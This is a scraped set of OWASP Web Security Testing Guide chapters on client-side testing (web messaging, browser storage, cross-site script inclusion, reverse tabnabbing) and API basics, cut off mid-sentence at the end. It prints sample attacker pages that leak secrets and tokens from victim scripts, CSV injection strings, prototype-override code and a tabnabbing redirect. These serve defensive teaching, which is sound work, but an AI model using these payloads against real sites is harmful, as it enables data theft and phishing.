should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.\n\nIn this example, access is needed for every subdomain (www, chat, forums, ...) within the owasp.org domain. The code is trying to accept any domain with `.owasp.org`:\n\n```js\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n    if(e.origin.indexOf(\".owasp.org\")!=-1) {\n        /* process message (e.data) */\n    }\n}\n```\n\nThe intention is to allow subdomains such as:\n\n- `www.owasp.org`\n- `chat.owasp.org`\n- `forums.owasp.org`\n\nUnfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as `www.owasp.org.attacker.com` will match.\n\nHere is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:\n\n```js\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n        /* process message (e.data) */\n}\n```\n\nHere is an example with input validation vulnerabilities that may lead to XSS attack:\n\n```js\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n        if(e.origin === \"trusted.domain.com\") {\n            element.innerHTML= e.data;\n        }\n}\n```\n\nA more secure approach would be to use the property `innerText` instead of `innerHTML`.\n\nFor further OWASP resources regarding web messaging, see [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:58.791897"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md", "content": "# Testing Browser Storage\n\n|ID          |\n|------------|\n|WSTG-CLNT-12|\n\n## Summary\n\nBrowsers provide the following client-side storage mechanisms for developers to store and retrieve data:\n\n- Local Storage\n- Session Storage\n- IndexedDB\n- Web SQL (Deprecated)\n- Cookies\n\nThese storage mechanisms can be viewed and edited using the browser's developer tools, such as [Google Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools/storage/localstorage) or [Firefox's Storage Inspector](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector).\n\nNote: While cache is also a form of storage it is covered in a [separate section](../04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md) covering its own peculiarities and concerns.\n\n## Test Objectives\n\n- Determine whether the website is storing sensitive data in client-side storage.\n- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.\n\n## How to Test\n\n### Local Storage\n\n`window.localStorage` is a global property that implements the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) and provides **persistent** key-value storage in the browser.\n\nBoth the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via [JSON.stringify](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify).\n\nEntries to `localStorage` persist even when the browser window closes, with the exception of windows in Private/Incognito mode.\n\nThe maximum storage capacity of `localStorage` varies between browsers.\n\n#### List All Key-Value Entries\n\n```javascript\nfor (let i = 0; i < localStorage.length; i++) {\n  const key = localStorage.key(i);\n  const value = localStorage.getItem(key);\n  console.log(`${key}: ${value}`);\n}\n```\n\n### Session Storage\n\n`window.sessionStorage` is a global property that implements the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) and provides **ephemeral** key-value storage in the browser.\n\nBoth the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via [JSON.stringify](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify).\n\nEntries to `sessionStorage` are ephemeral because they are cleared when the browser tab/window is closed.\n\nThe maximum storage capacity of `sessionStorage` varies between browsers.\n\n#### List All Key-Value Entries\n\n```javascript\nfor (let i = 0; i < sessionStorage.length; i++) {\n  const key = sessionStorage.key(i);\n  const value = sessionStorage.getItem(key);\n  console.log(`${key}: ${value}`);\n}\n```\n\n### IndexedDB\n\nIndexedDB is a transactional, object-oriented database intended for structured data. An IndexedDB database can have multiple object stores and each object store can have multiple objects.\n\nIn contrast to Local Storage and Session Storage, IndexedDB can store more than just strings. Any objects supported by the [structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) can be stored in IndexedDB.\n\nAn example of a complex JavaScript object that can be stored in IndexedDB, but not in Local/Session Storage are [CryptoKeys](https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey).\n\nW3C recommendation on [Web Crypto API](https://www.w3.org/TR/WebCryptoAPI/) [recommends](https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage) that CryptoKeys that need to be persisted in the browser, to be stored in IndexedDB. When testing a web page, look for any CryptoKeys in IndexedDB and check if they are set as `extractable: true` when they should have been set to `extractable: false` (i.e. ensure the underlying private key material is never exposed during cryptographic operations.)\n\n#### Print All the Contents of IndexedDB\n\n```javascript\nconst dumpIndexedDB = dbName => {\n  const DB_VERSION = 1;\n  const req = indexedDB.open(dbName, DB_VERSION);\n  req.onsuccess = function() {\n    const db = req.result;\n    const objectStoreNames = db.objectStoreNames || [];\n\n    console.log(`[*] Database: ${dbName}`);\n\n    Array.from(objectStoreNames).forEach(storeName => {\n      const txn = db.transaction(storeName, 'readonly');\n      const objectStore = txn.objectStore(storeName);\n\n      console.log(`\\t[+] ObjectStore: ${storeName}`);\n\n      // Print all entries in objectStore with name `storeName`\n      objectStore.getAll().onsuccess = event => {\n        const items = event.target.result || [];\n        items.forEach(item => console.log(`\\t\\t[-] `, item));\n      };\n    });\n  };\n};\n\nindexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));\n```\n\n### Web SQL\n\nWeb SQL is deprecated since November 18, 2010 and it's recommended that web developers do not use it.\n\n### Cookies\n\nCookies are a key-value storage mechanism that is primarily used for session management but web developers can still use it to store arbitrary string data.\n\nCookies are covered extensively in the [testing for Cookies attributes](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md) scenario.\n\n#### List All Cookies\n\n```javascript\nconsole.log(window.document.cookie);\n```\n\n### Global Window Object\n\nSometimes web developers initialize and maintain global state that is available only during the runtime life of the page by assigning custom attributes to the global `window` object. For example:\n\n```javascript\nwindow.MY_STATE = {\n  counter: 0,\n  flag: false,\n};\n```\n\nAny data attached on the `window` object will be lost when the page is refreshed or closed.\n\n#### List All Entries on the Window Object\n\n```javascript\n(() => {\n  // create an iframe and append to body to load a clean window object\n  const iframe = document.createElement('iframe');\n  iframe.style.display = 'none';\n  document.body.appendChild(iframe);\n\n  // get the current list of properties on window\n  const currentWindow = Object.getOwnPropertyNames(window);\n\n  // filter the list against the properties that exist in the clean window\n  const results = currentWindow.filter(\n    prop => !iframe.contentWindow.hasOwnProperty(prop)\n  );\n\n  // remove iframe\n  document.body.removeChild(iframe);\n\n  // log key-value entries that are different\n  results.forEach(key => console.log(`${key}: ${window[key]}`));\n})();\n```\n\n_(Modified version of this [snippet](https://stackoverflow.com/a/17246535/3099132))_\n\n### Attack Chain\n\nFollowing the identification any of the above attack vectors, an attack chain can be formed with different types of client-side attacks, such as [DOM based XSS](01-Testing_for_DOM-based_Cross_Site_Scripting.md) attacks.\n\n## Remediation\n\nApplications should be storing sensitive data on the server-side, and not on the client-side, in a secured manner following best practices.\n\n## References\n\n- [Local Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)\n- [Session Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)\n- [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)\n- [Web Crypto API: Key Storage](https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage)\n- [Web SQL](https://www.w3.org/TR/webdatabase/)\n- [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)\n\nFor more OWASP resources on the HTML5 Web Storage API, see the [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#html5-web-storage-api).\n", "timestamp": "2025-10-24T11:39:58.858602"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md", "content": "# Testing for Cross Site Script Inclusion\n\n|ID          |\n|------------|\n|WSTG-CLNT-13|\n\n## Summary\n\nCross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user's personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker's account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.\n\nBy default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by [RFC 6454](https://tools.ietf.org/html/rfc6454)). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML `<script>` tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.\n\nWhen the browser opens a website with `<script>` tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn't have to be a JavaScript file with type `text/javascript` or `.js` extension.\n\nOlder browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the `<script>` tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).\n\n## Test Objectives\n\n- Locate sensitive data across the system.\n- Assess the leakage of sensitive data through various techniques.\n\n## How to Test\n\n### Collect Data Using Authenticated and Unauthenticated User Sessions\n\nIdentify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using [JSONP](https://en.wikipedia.org/wiki/JSONP). To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they're different, it means the response is dynamic; otherwise it's static. To simplify this task, a tool such as [Veit Hailperin's Burp proxy plugin](https://github.com/luh2/DetectDynamicJS) can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.\n\n### Determine Whether the Sensitive Data Can Be Leaked Using JavaScript\n\nTesters should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:\n\n1. Global variables\n2. Global function parameters\n3. CSV (Comma Separated Values) with quotations theft\n4. JavaScript runtime errors\n5. Prototype chaining using `this`\n\n### 1. Sensitive Data Leakage via Global Variables\n\nAn API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim's website, `victim.com`, which is only accessible to authenticated users. An attacker configures a website, `attackingwebsite.com`, and uses the `<script>` tag to refer to the JavaScript file.\n\nHere are the contents of `https://victim.com/internal/api.js`:\n\n```javascript\n(function() {\n  window.secret = \"supersecretUserAPIkey\";\n})();\n```\n\nThe attack site, `attackingwebsite.com`, has an `index.html` with the following code:\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking data via global variables</title>\n  </head>\n  <body>\n    <h1>Leaking data via global variables</h1>\n    <script src=\"https://victim.com/internal/api.js\"></script>\n    <div id=\"result\">\n    </div>\n    <script>\n      var div = document.getElementById(\"result\");\n      div.innerHTML = \"Your secret data <b>\" + window.secret + \"</b>\";\n    </script>\n  </body>\n</html>\n```\n\nIn this example, a victim is authenticated with `victim.com`. An attacker lures the victim to `attackingwebsite.com` via social engineering, phishing emails, etc. The victim's browser then fetches `api.js`, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using `innerHTML`.\n\n### 2. Sensitive Data Leakage via Global Function Parameters\n\nThis example is similar to the previous one, except in this case `attackingwebsite.com` uses a global JavaScript function to extract the sensitive data by overwriting the victim's global JavaScript function.\n\nHere are the contents of `https://victim.com/internal/api.js`:\n\n```javascript\n(function() {\n  var secret = \"supersecretAPIkey\";\n  window.globalFunction(secret);\n})();\n```\n\nThe attack site, `attackingwebsite.com`, has an `index.html` with the following code:\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking data via global function parameters</title>\n  </head>\n  <body>\n    <div id=\"result\">\n    </div>\n    <script>\n      function globalFunction(param) {\n        var div = document.getElementById(\"result\");\n        div.innerHTML = \"Your secret data: <b>\" + param + \"</b>\";\n      }\n    </script>\n    <script src=\"https://victim.com/internal/api.js\"></script>\n  </body>\n</html>\n```\n\nThere are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).\n\n### 3. Sensitive Data Leakage via CSV with Quotations Theft\n\nTo leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada's [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf) whitepaper.\n\n```text\nHTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\"a.csv\"\nContent-Length: xxxx\n\n1,\"___\",\"aaa@a.example\",\"03-0000-0001\"\n2,\"foo\",\"bbb@b.example\",\"03-0000-0002\"\n...\n98,\"bar\",\"yyy@example.net\",\"03-0000-0088\"\n99,\"___\",\"zzz@example.com\",\"03-0000-0099\"\n```\n\nIn this example, using the `___` columns as injection points and inserting JavaScript strings in their place has the following result.\n\n```text\n1,\"\\\"\",$$$=function(){/*\",\"aaa@a.example\",\"03-0000-0001\"\n2,\"foo\",\"bbb@b.example\",\"03-0000-0002\"\n...\n98,\"bar\",\"yyy@example.net\",\"03-0000-0088\"\n99,\"*/}//\",\"zzz@example.com\",\"03-0000-0099\"\n```\n\n[Jeremiah Grossman wrote about a similar vulnerability in Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking gmail contacts via JSON </title>\n  </head>\n  <body>\n    <script>\n      function Array() {\n        // steal data\n      }\n    </script>\n    <script src=\"https://mail.google.com/mail/?_url_scrubbed_\"></script>\n  </body>\n</html>\n```\n\n### 4. Sensitive Data Leakage via JavaScript Runtime Errors\n\nBrowsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `https://victim.com/service/csvendpoint` for authenticated users:\n\n```text\nHTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\"a.csv\"\nContent-Length: 13\n\n1,abc,def,ghi\n```\n\nThis vulnerability could be exploited with the following:\n\n```html\n<!--error handler -->\n<script>window.onerror = function(err) {alert(err)}</script>\n<!--load target CSV -->\n<script src=\"https://victim.com/service/csvendpoint\"></script>\n```\n\nWhen the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:\n\n![JavaScript runtime error message ](images/XSSI1.jpeg)\\\n*Figure 4.11.13-1: JavaScript runtime error message*\n\n### 5. Sensitive Data Leakage via Prototype Chaining Using `this`\n\nIn JavaScript, the `this` keyword is dynamically scoped. This means if a function is called upon an object, `this` will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from [Sebastian Leike's demonstration page](http://sebastian-lekies.de/leak/), the sensitive data is stored in an Array. An attacker can override `Array.prototype.forEach` with an attacker-controlled function. If some code calls the `forEach` function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with `this` pointing to the object that contains the sensitive data.\n\nHere is an excerpt of a JavaScript file containing sensitive data, `javascript.js`:\n\n```javascript\n...\n(function() {\n  var secret = [\"578a8c7c0d8f34f5\", \"345a8b7c9d8e34f5\"];\n\n  secret.forEach(function(element) {\n    // do something here\n  });  \n})();\n...\n```\n\nThe sensitive data can be leaked with the following JavaScript code:\n\n```html\n...\n <div id=\"result\">\n\n    </div>\n    <script>\n      Array.prototype.forEach = function(callback) {\n        var resultString = \"Your secret values are: <b>\";\n        for (var i = 0, length = this.length; i < length; i++) {\n          if (i > 0) {\n            resultString += \", \";\n          }\n          resultString += this[i];\n        }\n        resultString += \"</b>\";\n        var div = document.getElementById(\"result\");\n        div.innerHTML = resultString;\n      };\n    </script>\n    <script src=\"https://victim.com/..../javascript.js\"></script>\n...\n```\n", "timestamp": "2025-10-24T11:39:58.923607"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing.md", "content": "# Testing for Reverse Tabnabbing\n\n|ID          |\n|------------|\n|WSTG-CLNT-14|\n\n## Summary\n\n[Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing) is an attack which can be used to redirect users to phishing pages. This usually becomes possible due to the `target` attribute of the `<a>` tag being set to `_blank` which causes the link to be opened in a new tab. When the attribute `rel='noopener noreferrer'` is not used in the same `<a>` tag, the newly opened page can influence the original page and redirect it to a domain controlled by the attacker.\n\nSince the user was on the original domain when the new tab opened, they are less likely to notice that the page has changed, especially if the phishing page is identical to the original domain. Any credentials entered on the attacker-controlled domain will thus end up in the attacker's possession.\n\nLinks opened via the `window.open` JavaScript function are also vulnerable to this attack.\n\n_NOTE: This is a legacy issue that does not affect [modern browsers](https://caniuse.com/mdn-html_elements_a_implicit_noopener). Older versions of popular browsers (For example, versions prior to Google Chrome 88) as well as Internet Explorer are vulnerable to this attack._\n\n### Example\n\nImagine a web application where users are allowed to insert a URL in their profile. If the application is vulnerable to reverse tabnabbing, a malicious user will be able to provide a link to a page that has the following code:\n\n```html\n<html>\n <body>\n  <script>\n    window.opener.location = \"https://example.org\";\n  </script>\n<b>Error loading...</b>\n </body>\n</html>\n```\n\nClicking on the link will open up a new tab while the original tab will redirect to \"example.org\". Suppose \"example.org\" looks similar to the vulnerable web application, the user is less likely to notice the change and is more likely to enter sensitive information on the page.\n\n## How to Test\n\n- Check the HTML source of the application to see if links with `target=\"_blank\"` are using the `noopener` and `noreferrer` keywords in the `rel` attribute. If not, it is likely that the application is vulnerable to reverse tabnabbing. Such a link becomes exploitable if it either points to a third-party site that has been compromised by the attacker, or if it is user-controlled.\n- Check for areas where an attacker can insert links, i.e. control the `href` argument of an `<a>` tag. Try to insert a link to a page which has the source code given in the above example, and see if the original domain redirects. This test can be done in IE if other browsers don't work.\n\n## Remediation\n\nIt is recommended to make sure that the `rel` HTML attribute is set with the `noreferrer` and `noopener` keywords for all links.\n\n## References\n\n- [Tabnabbing - HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing)\n- [The target=\"_blank\" vulnerability by example](https://dev.to/ben/the-targetblank-vulnerability-by-example)\n- [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)\n- [Target=”_blank” — the most underestimated vulnerability ever](https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c)\n- [Reverse tabnabbing vulnerability affects IBM Business Automation Workflow and IBM Business Process Manager](https://www.ibm.com/support/pages/security-bulletin-reverse-tabnabbing-vulnerability-affects-ibm-business-automation-workflow-and-ibm-business-process-manager-bpm-cve-2020-4490-0)\n", "timestamp": "2025-10-24T11:39:59.019604"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/README.md", "content": "# 4.11 Client-Side Testing\n\n4.11.1 [Testing for DOM-Based Cross Site Scripting](01-Testing_for_DOM-based_Cross_Site_Scripting.md)\n\n- 4.11.1.1 [Testing for Self DOM Based Cross Site Scripting](01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting.md)\n\n4.11.2 [Testing for JavaScript Execution](02-Testing_for_JavaScript_Execution.md)\n\n4.11.3 [Testing for HTML Injection](03-Testing_for_HTML_Injection.md)\n\n4.11.4 [Testing for Client-side URL Redirect](04-Testing_for_Client-side_URL_Redirect.md)\n\n4.11.5 [Testing for CSS Injection](05-Testing_for_CSS_Injection.md)\n\n4.11.6 [Testing for Client-side Resource Manipulation](06-Testing_for_Client-side_Resource_Manipulation.md)\n\n4.11.7 [Testing Cross Origin Resource Sharing](07-Testing_Cross_Origin_Resource_Sharing.md)\n\n4.11.8 [Testing for Cross Site Flashing](08-Testing_for_Cross_Site_Flashing.md)\n\n4.11.9 [Testing for Clickjacking](09-Testing_for_Clickjacking.md)\n\n4.11.10 [Testing WebSockets](10-Testing_WebSockets.md)\n\n4.11.11 [Testing Web Messaging](11-Testing_Web_Messaging.md)\n\n4.11.12 [Testing Browser Storage](12-Testing_Browser_Storage.md)\n\n4.11.13 [Testing for Cross Site Script Inclusion](13-Testing_for_Cross_Site_Script_Inclusion.md)\n\n4.11.14 [Testing for Reverse Tabnabbing](14-Testing_for_Reverse_Tabnabbing.md)\n", "timestamp": "2025-10-24T11:39:59.115617"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview.md", "content": "# API Testing Overview\n\n## Web API Introduction\n\nA Web Application Programming Interface (API) facilitates communication and data exchange between different software systems over a network or the internet. Web APIs enable different applications to interact with each other in a standardized and efficient manner, allowing them to leverage each other's functionalities and data.\n\nThe adoption of different technologies such as cloud computing, microservice architectures, and single page applications have all contributed to the adoption of APIs as an architectural movement.\n\nAs with the introduction of any new concepts, there can be flaws and vulnerabilities that necessitate testing. Otherwise, poorly secured APIs may provide an unrestricted direct path to sensitive data.\n\nThis chapter attempts to guide the security researcher in the concepts necessary for testing APIs. This section in particular investigates the different API technologies and their history.\n\n## Which API Technology?\n\nBefore we make assumptions about the type of API we are testing, it can be helpful to be aware of the full scope of the problem space that the security researcher may encounter. These include:\n\n1. Representational State Transfer (REST) APIs\n2. Simple Object Access Protocol (SOAP) APIs\n3. GraphQL APIs\n4. gRPC Remote Procedure Calls (gRPC)\n5. WebSockets APIs\n\n## REST (Representational State Transfer) APIs\n\n### What is REST?\n\nREST is a set of rules and conventions for interacting with web resources. The key components of URI, HTTP Methods, Headers, and Status Codes support the principles of REST.\n\n### History\n  \nDue to their simplicity, scalability, and compatibility with existing web infrastructure, REST based APIs have become the most common API architecture on the internet at the time of this writing. REST based APIs did not immediately manifest, but rather have a long path from research to adoption.\n\nIn 1994 Roy Fielding, one of the principal authors of the HTTP specification, began his work on REST as part of his doctoral dissertation at the University of California, Irvine. By 2000, he published his dissertation, [Architectural Styles and the Design of Network-based Software Architectures](https://ics.uci.edu/~fielding/pubs/dissertation/top.htm), where he introduced and defined REST as an architectural style. REST was designed to take advantage of the existing features of HTTP, emphasizing scalability, stateless interactions, and a uniform interface.\n\nIn the 2010s REST became the de facto standard for web APIs due to its simplicity and compatibility with the web's underlying architecture. The widespread use of RESTful APIs was driven by the growth of mobile applications, cloud computing, and microservices architecture. The development of tools and frameworks like Swagger/OpenAPI, RAML, and API Blueprint facilitated the design, documentation, and testing of REST APIs.\n\nBy the 2020s modern developments evolved REST with technologies such as GraphQL. In addition, the OpenAPI/Swagger specification became a widely adopted standard for describing REST APIs, enabling better integration and automation.\n\n### Uniform Resource Identifiers\n\nREST APIs use Uniform Resource Identifiers (URIs) to access resources. URIs are a crucial element of a REST Architecture. A URI is a string of characters that uniquely identifies a particular resource. URIs are used extensively on the internet to locate and interact with resources, such as web pages, files, and services.\n\nA URI consists of several components, each serving a specific purpose. The generic URI syntax as defined in [RFC3986](https://tools.ietf.org/html/rfc3986) is below:\n\n> `URI = scheme \"://\" authority \"/\" path [ \"?\" query ] [ \"#\" fragment ]`\n\nFor REST, the **scheme** is typically `HTTP` or `HTTPS` but generically indicates the protocol or method used to access the resource. Other common schemes include `ftp`, `mailto`, and `file`.\n\nThe **authority** specifies the domain name or IP address of the server where the resource resides, and may include a port number. It may also include userinfo as a subcomponent.\n\nThe **path** specifies the specific location of the resource on the server. We are interested in the path of URI as the relationship between user and resources. For example, `https://api.example.com/admin/testing/report` may show a test report. There is relationship between the user admin and their reports.\n\nThe path of any URI will define a REST API resource model. Resources are separated by a forward slash and based on Top-Down design.\n\nFor example:\n\n- `https://api.example.com/admin/testing/report`\n- `https://api.example.com/admin/testing/`\n- `https://api.example.com/admin/`\n\nThe **query** provides additional parameters for the resource. It starts with a `?` and consists of key-value pairs separated by `&`.\n\nThe **fragment** indicates a specific part of the resource, such as a section within a web page. It starts with a `#`. It's worth noting that fragment identifiers are only processed client-side and not sent to the server.\n\n### HTTP Methods\n\nREST APIs use standard HTTP methods to perform operations on resources following the [HTTP Request Methods](https://tools.ietf.org/html/rfc7231#section-4) defined in [RFC7231](https://tools.ietf.org/html/rfc7231). These methods map to CRUD, the four basic functions of persistent storage in computer science. CRUD stands for Create, Read, Update, and Delete, which are the four operations that can be performed on data.\n\nHTTP Request Methods are:\n\n| Methods | Description                                   |\n|---------|-----------------------------------------------|\n| GET     | Get the representation of resource’s state    |\n| POST    | Create a new resource                         |\n| PUT     | Update a resource                             |\n| DELETE  | Remove a resource                             |\n| HEAD    | Get metadata associated with resource’s state |\n| OPTIONS | List available methods                        |\n\n#### Headers\n\nREST relies on headers to support communication of additional information within the request or response. These include:\n\n- `Content-Type`: Indicates the media type of the resource (e.g. `application/json`).\n- `Authorization`: Contains credentials for authentication (e.g. tokens).\n- `Accept`: Specifies the media types that are acceptable for the response.\n\n#### Status Codes\n\nApplication APIs that conform to REST principles use the response status code of an HTTP response message to notify the client about their request’s result.\n\n| Response Code | Response Message      | Description   |\n|---------------|-----------------------|--------------------------------------------------------------------------------------------------------|\n| 200           | OK                    | Success while processing client's request                                                              |\n| 201           | Created               | New resource created                                                                                   |\n| 301           | Moved Permanently     | Permanent redirection                                                                                  |\n| 304           | Not Modified          | Caching related response that returned when the client has the same copy of the resource as the server |\n| 307           | Temporary Redirect    | Temporary redirection of resource                                                                      |\n| 400           | Bad Request           | Malformed request by the client                                                                        |\n| 401           | Unauthorized          | Client is not allowed to make requests or access a particular resource                                 |\n| 403           | Forbidden             | Client is forbidden to access the resource                                                             |\n| 404           | Not Found             | Resource doesn't exist or incorrect based on the request                                               |\n| 405           | Method Not Allowed    | Invalid method or unknown method used                                                                  |\n| 500           | Internal Server Error | Server failed to process request due to an internal error                                              |\n\n## References\n\n1. [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)\n2. [OWASP REST Assessment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html)\n3. [OWASP API Security Project](https://owasp.org/www-project-api-security/)\n4. [OWASP API Security Tools](https://owasp.org/www-community/api_security_tools)\n", "timestamp": "2025-10-24T11:39:59.593772"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md", "content": "# API Reconnaissance\n\n|ID          |\n|------------|\n|WSTG-APIT-01|\n\n## Summary\n\nReconnaissance is an important step in any pentesting engagement. This includes API pentesting. Reconnaissance significantly enhances the effectiveness of the testing process by gathering information about the API and developing an understanding of the target. This phase not only increases the likelihood of discovering critical security issues but also ensures a comprehensive evaluation of the APIs' security posture.\n\nThis guide has a section on [Information Gathering](../01-Information_Gathering/README.md) which can apply when auditing APIs. However, there are some differences. As security researchers, we often focus on specific areas and searching this guide for the sections that apply can be time consuming. To ensure the researcher has a single location to focus on APIs this section concentrates on those items that apply to APIs and provides references to supporting content elsewhere in the guide.\n\n### API Types\n\nAPIs can be public or private.\n\n#### Public APIs\n\nPublic APIs typically have their details published in a Swagger/OpenAPI document. Gaining access to this document is important to understand the attack surface. Equally important is finding older versions of this document that might show deprecated but still functional code that may have security vulnerabilities.\n\nKeep in mind that this document, however well intentioned, may not be accurate, and also may not dislose the complete API.\n\nPublic APIs may also be documented on shared libraries or directories of APIs.\n\n#### Private APIs\n\nThe visibility of private APIs depends on who the intended consumer is. An API can be private, but only accessible to subscribed clients (also known as `partners`) or only accessible to internal clients, such as other departments within the same company. Finding private APIs using reconnaissance techniques is also important. These APIs can be discovered using a number of techniques which we will discuss below.\n\n## Test Objectives\n\n- Find all API endpoints supported by the backend server code, documented or undocumented.\n- Find all parameters for each endpoint supported by the backend server, documented or undocumented.\n- Discover interesting data related to APIs in HTML and JavaScript sent to clients.\n\n## How to Test\n\n### Find the Documentation\n\nIn both public and private cases, the API documentation will be useful based on its level of the quality and accurracy. Public API documentaton is typically shared with everyone whereas private API documentation is only shared with the intended client. However, in both cases finding documentation, accidentally leaked or otherwise will be helpfull in your 